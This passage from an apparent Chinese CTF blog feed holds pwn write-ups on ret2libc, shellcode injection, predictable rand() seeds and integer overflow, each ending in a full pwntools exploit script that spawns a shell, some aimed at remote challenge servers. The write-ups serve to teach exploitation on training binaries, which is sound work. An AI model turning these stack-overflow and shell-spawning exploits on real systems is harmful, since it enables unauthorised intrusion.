src="https://img-blog.csdnimg.cn/20190324123353663.png"></p><p>即发现puts函数可作为泄露函数</p><p>栈溢出覆盖read的返回地址，得到payload1</p><p>再有ida寻找到main函数的地址</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload1<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后接收puts的地址，由LibcSearcher包提供的方法找到对应libc版本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc <span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>  <span class="token comment">#需要from LibcSearcher import *</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>随后计算偏移量得到paylod2</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload2<span class="token operator">=</span>payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"aaaa"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可得到shell</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>main<span class="token operator">=</span><span class="token number">0x80484FD</span>payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'try\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>puts<span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>libcbase<span class="token operator">=</span>puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>bin_sh<span class="token operator">=</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">104</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"aaaa"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-shellcode</title>
      <link href="//post/pwn-shellcode.html"/>
      <url>//post/pwn-shellcode.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-shellcode"><a href="#pwn-shellcode" class="headerlink" title="pwn-shellcode"></a>pwn-shellcode</h1><p>题目来自 **CTFwiki 基本ROP **</p><span id="more"></span><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/0f68a93d68d1e7198d76afa130e6e7a791adc2ac.png"></p><p>gets函数和strncpy函数存在漏洞</p><p>溢出s使返回地址为bss段的buf2，在往buf2中添加shellcode即可</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#p=remote("ip","port")</span>sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ret2shell'</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#利用pwntools的shellcraft板块生成shellcode</span>buf2_adr<span class="token operator">=</span><span class="token number">0x0804A080</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"time !!!"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf2_adr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">#.ljust(n,'a')将不足n个字符的部分用‘a’填充</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-随机数漏洞</title>
      <link href="//post/pwn-%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E%E2%80%9C.html"/>
      <url>//post/pwn-%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E%E2%80%9C.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-随机数漏洞"><a href="#pwn-随机数漏洞" class="headerlink" title="pwn-随机数漏洞"></a>pwn-随机数漏洞</h1><p>PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。</p><h2 id="关于rand-和sand"><a href="#关于rand-和sand" class="headerlink" title="关于rand()和sand()"></a>关于rand()和sand()</h2><h3 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h3><p>rand()函数是使用线性同余法生成随机数，因为其周期特别长，所以在一定范围内可以看成随机的。但每次生成都是固定的序列</p><p>我们使用如下代码生成10个随机数：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span> </span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时查看运行结果，多次运行结果一样。</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a696f0fc2180e37d2d58c4dc6f5c157a3041bf7b.png"></p><p>srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用时间time(NULL)或time(0)作为seed。当我们不设置srand()时，将默认为srand(1)。如果我们设置某个固定的seed，那么虽然在同一次运行时，会有不同的随机数产生，但是对于这段程序的多次运行所得到的结果是不变的。如下代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span> </span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"seed = 2:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nseed = 3:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nseed = 2:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如图：</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/07e3e8f184781cabd639a53460fd6c9f15769c4d.png"></p><h2 id="攻防世界guess-num"><a href="#攻防世界guess-num" class="headerlink" title="攻防世界guess_num"></a>攻防世界guess_num</h2><p>来自攻防世界的guess_num</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先用IDApro反汇编elf文件，关键部分如下</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bf5bb2241525becc1bafea07f7a55eaafb10cbd3.png"></p><p>反汇编后发现随机数漏洞</p><p>即可以通过覆盖name的值来改变seed的值</p><p>而C语言随机数中的随机数为伪随机数，可以通过在Linux系统中编写相同seed的代码找到这些随机数</p><h3 id="成成随机数的代码"><a href="#成成随机数的代码" class="headerlink" title="成成随机数的代码"></a>成成随机数的代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>c<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"220.249.52.134"</span><span class="token punctuation">,</span><span class="token string">"48107"</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ins<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>  <span class="token comment">#通过gcc编译的代码找到的随机数</span><span class="token keyword">for</span> i <span class="token keyword">in</span> ins<span class="token punctuation">:</span>c<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"number:"</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment">#注意，sendline发送的都为字符型数据，要想发送数字得加上str()函数</span>c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="HGAME-2018-guess-number"><a href="#HGAME-2018-guess-number" class="headerlink" title="HGAME 2018 guess_number"></a>HGAME 2018 guess_number</h2><p>杭电的Vidar-Team举办的校内赛，其中也有一道利用随机数漏洞的题</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>题目流程很简单，首先生成一个随机数，使用这个随机数作为rand()的种子，生成随机数，与用户输入的随机数进行比较，比较正确就会返回system(‘cat flag’)。</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a16187c541ebc6700f0655d7471a7353a4c08a65.png"></p><p>在这题中，并不需要利用随机数伪随机的性质，在guess_num函数中的栈溢出是可以利用的，这个随机数是以参数的方式传入的，在比较时寻址方式是用ebp+4来寻址的，也就是说利用栈溢出覆盖，完全可以将随机数覆盖成任意值。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> timep <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'111.230.149.72 '</span><span class="token punctuation">,</span> <span class="token number">10002</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'enter your guess:'</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token string">"0\x00"</span>a <span class="token operator">=</span> a<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x128</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn整数溢出</title>
      <link href="//post/pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA.html"/>
      <url>//post/pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn整数溢出"><a href="#pwn整数溢出" class="headerlink" title="pwn整数溢出"></a>pwn整数溢出</h1><h2 id="整数溢出原理"><a href="#整数溢出原理" class="headerlink" title="整数溢出原理"></a>整数溢出原理</h2><h3 id="具体原理"><a href="#具体原理" class="headerlink" title="具体原理"></a>具体原理</h3><p>​    在 C 语言中，整数的基本数据类型分为短整型 (short)，整型 (int)，长整型 (long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围，(因为数据类型的大小范围是编译器决定的，所以之后所述都默认是 64 位下使用 gcc-5.4)，当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。</p><span id="more"></span><p>具体数据类型的范围如下：</p><table><thead><tr><th>类型</th><th>字节</th><th>范围</th></tr></thead><tbody><tr><td>short int</td><td>2byte(word)</td><td>-32768~32767</td></tr><tr><td>unsigned short int</td><td>2byte(word)</td><td>0<del>65535(0</del>0xffff)</td></tr><tr><td>int</td><td>4byte(dword)</td><td>-2147483648~2147483647</td></tr><tr><td>unsigned int</td><td>4byte(dword)</td><td>0<del>4294967295(0</del>0xffffffff)</td></tr><tr><td>long int</td><td>8byte(qword)</td><td>正: 0<del>0x7fffffffffffffff 负: 0x8000000000000000</del>0xffffffffffffffff</td></tr><tr><td>unsigned long int</td><td>8byte(qword)</td><td>0~0xffffffffffffffff</td></tr></tbody></table><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> var1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> var2 <span class="token operator">=</span> <span class="token number">65537</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">==</span> var2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"溢出"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/2b0ad190f6187e2d886cefb31556ab673e3a04fe.png"></p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/afae5ed583f99d724d404aaeff515d2f23d15061.png"></p><h2 id="WUST-CTF-number-game"><a href="#WUST-CTF-number-game" class="headerlink" title="WUST-CTF number_game"></a>WUST-CTF number_game</h2><p>武汉科技大学的ctf萌新赛，是我在找这个方面的题目时发现的，考查整数溢出的知识</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>反汇编elf文件</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bc437d2cf2843f22c5853067e1caed0fa836194c.png"></p><p>可以看到是需要输入一个数小于0，取反之后再次小于0即可得到shell</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/b5efb7544a2bd617a9be8ec601cbbb40ca79e9d4.png"></p><p>由于v1是int型，故最多表示4,294,967,296个数，含有符号，即表示</p><p><strong>-2147483648~2147483647</strong></p><p>故可取v1 = -2147483648</p><p>则v1取符号后仍未负数</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'.\number_game'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147483648</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#注意，sendline发送的都为字符型数据，要想发送数字得加上str()函数</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="攻防世界int-overflow"><a href="#攻防世界int-overflow" class="headerlink" title="攻防世界int_overflow"></a>攻防世界int_overflow</h2><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/743f07915787a751331bae9ce87e0feb25e6a94a.png"></p><p>连接：<a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5058&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5058&amp;page=1</a></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>附件checkesc分析</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/500e04fb9ea10fe74c6c5b0bdfd1ad52dacb399c.png"></p><p>没有开启canary保护，可以使用栈溢出的漏洞</p><p>接着使用IDApro分析</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/d6b5560104d1c0681659e20aa6663c3ebf0e49d3.png"></p><p>main函数中没有什么问题</p><p>接着检查login（）函数</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/76a6cb4493cfe0c4ef4e0b5c2055a8f88cdcfc4f.png"></p><p>检查check_passwd()函数：</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/5f3ccf452e0bcf3dc5d697038616801e74ef585f.png"></p><p>注意变量v3，这里就会存在整数溢出漏洞</p><p>对输入的数字s的长度限制在4-8位之间，但是v3为unsigned int8型变量，即为无符号的8bits大小整数</p><p>最大值应该为255：</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/495a914ed8834f34a49e0bcf7ffc02badbe090b9.png"></p><p>如果超出255，就会溢出，即对于unsigned int8型的变量v1和v2，如果v1=0,v2=256；则v1==v2;</p><p>故此题的输入密码的长度应为 4 ~ 8 或 255+4 ~ 255+8</p><p>找到漏洞后，按shift+f12查找关键字</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/ba79c6f648519d0357a7bea5f500784f0cd29a40.png"></p><p>即发现cat flag关键字</p><p>即发现函数</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/5f5b23c5c9b377972d3f22ce424d44b363d0d555.png"></p><p>查看地址</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a6e5da8d24384845f823330bb49e0cd91e12a0da.png"></p><p>得到函数的starts地址，即可在输入passwd时构造字符将chack_passwd的函数返回地址改为what_is_this()函数的地址</p><p>且由于dest变量到栈底的偏移量为0x14，故即可构造exp</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>c<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'220.249.52.134'</span><span class="token punctuation">,</span><span class="token number">36374</span><span class="token punctuation">)</span>flag_adress<span class="token operator">=</span><span class="token number">0x804868B</span>payload<span class="token operator">=</span><span class="token string">"zbrnb"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x14</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>flag_adress<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"zbrnb"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span><span class="token number">0x14</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Please input your username:\n"</span><span class="token punctuation">,</span><span class="token string">"Retr_0nb"</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your passwd:\n"</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span 